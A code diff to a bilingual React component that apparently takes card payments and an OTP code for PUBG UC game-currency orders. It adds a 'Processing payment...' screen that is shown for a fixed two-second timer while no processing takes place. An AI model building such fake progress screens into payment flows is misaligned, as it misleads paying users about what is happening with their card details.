@@ -83,6 +83,7 @@ export function PubgUcOrder({
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [cardValidationError, setCardValidationError] = useState<CardValidationReason | null>(null);
   const [showOtpStep, setShowOtpStep] = useState(false);
+  const [cardProcessingToOtp, setCardProcessingToOtp] = useState(false);
   const [otpCode, setOtpCode] = useState('');
   const [otpState, setOtpState] = useState<OtpState>('idle');
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
@@ -96,6 +97,7 @@ export function PubgUcOrder({
 
   const resetFlow = () => {
     setShowOtpStep(false);
+    setCardProcessingToOtp(false);
     setOtpCode('');
     setOtpState('idle');
     setCurrentOrderId(null);
@@ -144,11 +146,21 @@ export function PubgUcOrder({
       });
       if (!res.ok) { setIsSubmitting(false); return; }
       const data = await res.json();
-      setCurrentOrderId(data.order_ref || data.id);
-      setShowOtpStep(true);
+      const orderRef = data.order_ref || data.id;
+      if (!orderRef) {
+        setIsSubmitting(false);
+        return;
+      }
+      setCurrentOrderId(orderRef);
+      setCardProcessingToOtp(true);
+      setTimeout(() => {
+        setShowOtpStep(true);
+        setCardProcessingToOtp(false);
+        setIsSubmitting(false);
+      }, 2000);
+      return;
     } catch (err) {
       console.error(err);
-    } finally {
       setIsSubmitting(false);
     }
   };
@@ -194,6 +206,19 @@ export function PubgUcOrder({
           className="w-full max-w-xs bg-gray-900 text-white py-4 rounded-2xl font-bold active:scale-95">
           {lang === 'ar' ? 'العودة للخدمات' : 'Back to Services'}
         </button>
+      </div>
+    );
+  }
+
+  // جاري المعالجة قبل OTP
+  if (cardProcessingToOtp) {
+    return (
+      <div className="max-w-md mx-auto pb-6">
+        <div className="bg-white rounded-2xl border border-gray-100 p-8 text-center space-y-5">
+          <Activity className="w-12 h-12 text-red-600 animate-pulse mx-auto" />
+          <h3 className="font-black text-lg text-gray-900">{lang === 'ar' ? 'جاري معالجة الدفع...' : 'Processing payment...'}</h3>
+          <p className="text-sm text-gray-400">{lang === 'ar' ? 'سيتم نقلك لصفحة رمز التحقق خلال لحظات' : 'You will be redirected to OTP verification shortly'}</p>
+        </div>
       </div>
     );
   }
